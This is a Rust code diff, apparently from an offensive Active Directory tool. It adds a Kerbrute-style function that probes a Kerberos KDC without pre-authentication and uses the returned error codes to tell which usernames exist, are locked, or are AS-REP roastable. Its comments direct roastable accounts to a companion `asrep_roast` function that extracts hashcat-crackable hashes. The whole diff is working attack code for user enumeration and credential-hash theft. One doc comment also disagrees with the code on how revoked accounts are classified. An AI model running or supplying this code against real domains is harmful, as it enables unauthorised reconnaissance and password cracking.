@@ -21,7 +21,7 @@ use picky_asn1::wrapper::{
 };
 use picky_krb::constants::types::{AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST};
 use picky_krb::data_types::{KerberosTime, PrincipalName};
-use picky_krb::messages::{AsRep, AsReq, KdcReq, KdcReqBody};
+use picky_krb::messages::{AsRep, AsReq, KdcReq, KdcReqBody, KrbError};
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
@@ -227,6 +227,75 @@ pub(crate) async fn kdc_exchange(kdc: &str, request: &[u8]) -> Result<Vec<u8>> {
     let mut buf = vec![0u8; n];
     stream.read_exact(&mut buf).await?;
     Ok(buf)
+}
+
+/// **1.4.8-A WS-KERBRUTE**: probe one username against the KDC without pre-auth,
+/// classify the response. Kerberos leaks user existence via its error codes — a
+/// user that exists rejects with `KDC_ERR_PREAUTH_REQUIRED` (25) or (if account
+/// has `DONT_REQ_PREAUTH`) succeeds and returns an AS-REP; an unknown principal
+/// rejects with `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6). This is the primitive `Kerbrute`
+/// et al. wrap; no LDAP creds needed.
+///
+/// Returns [`KerbruteOutcome::Exists`] for `PREAUTH_REQUIRED` / `PREAUTH_FAILED` /
+/// `CLIENT_REVOKED`, [`KerbruteOutcome::Roastable`] when the KDC skips pre-auth and
+/// returns an AS-REP (the account has `DONT_REQ_PREAUTH` — feed to `asrep_roast`),
+/// [`KerbruteOutcome::Missing`] for `C_PRINCIPAL_UNKNOWN`, and
+/// [`KerbruteOutcome::Other`] for any other KDC error code with the numeric value.
+pub async fn kerbrute_probe(user: &str, realm: &str, kdc: &str) -> Result<KerbruteOutcome> {
+    let raw = picky_asn1_der::to_vec(&build_as_req(user, realm)?)
+        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let resp = kdc_exchange(kdc, &raw).await?;
+    // AS-REP first — accounts with DONT_REQ_PREAUTH answer immediately with the
+    // ticket + hashcat-roastable enc-part. Signal it as Roastable so callers can
+    // pipe into asrep_roast() for the actual hash.
+    if picky_asn1_der::from_bytes::<AsRep>(&resp).is_ok() {
+        return Ok(KerbruteOutcome::Roastable);
+    }
+    // Otherwise a KRB-ERROR is the RFC-mandated response and its `error_code`
+    // classifies user existence per RFC 4120 §7.5.9.
+    match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+        Ok(err) => {
+            let code = err.0.error_code.0;
+            Ok(match code {
+                6 => KerbruteOutcome::Missing, // KDC_ERR_C_PRINCIPAL_UNKNOWN
+                18 => KerbruteOutcome::Locked, // KDC_ERR_CLIENT_REVOKED (disabled / locked)
+                24 => KerbruteOutcome::Exists, // KDC_ERR_PREAUTH_FAILED (bad pw, but exists)
+                25 => KerbruteOutcome::Exists, // KDC_ERR_PREAUTH_REQUIRED (normal path)
+                other => KerbruteOutcome::Other(other),
+            })
+        }
+        Err(e) => Err(anyhow!(
+            "unexpected AS response — neither AS-REP nor KRB-ERROR ({e})"
+        )),
+    }
+}
+
+/// Result of a [`kerbrute_probe`] call. See variant docs for the KDC error-code
+/// mapping.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum KerbruteOutcome {
+    /// User exists (KDC replied `KDC_ERR_PREAUTH_REQUIRED` or `_FAILED`).
+    Exists,
+    /// User exists and skips pre-auth (`DONT_REQ_PREAUTH`) — AS-REP roastable.
+    /// Feed the same `(user, realm, kdc)` to [`asrep_roast`] to extract the
+    /// hashcat 18200 line.
+    Roastable,
+    /// User exists but the account is disabled or locked
+    /// (`KDC_ERR_CLIENT_REVOKED`).
+    Locked,
+    /// User does not exist (`KDC_ERR_C_PRINCIPAL_UNKNOWN`).
+    Missing,
+    /// Any other KDC error code; the numeric value is preserved for the caller
+    /// to interpret against RFC 4120 §7.5.9.
+    Other(u32),
+}
+
+impl KerbruteOutcome {
+    /// True when this outcome confirms the user exists (Exists / Roastable / Locked).
+    /// Convenience for callers that only care about the existence bit.
+    pub fn exists(&self) -> bool {
+        matches!(self, Self::Exists | Self::Roastable | Self::Locked)
+    }
 }
 
 /// Perform an AS-REP roast against one candidate; returns the hashcat 18200 line.
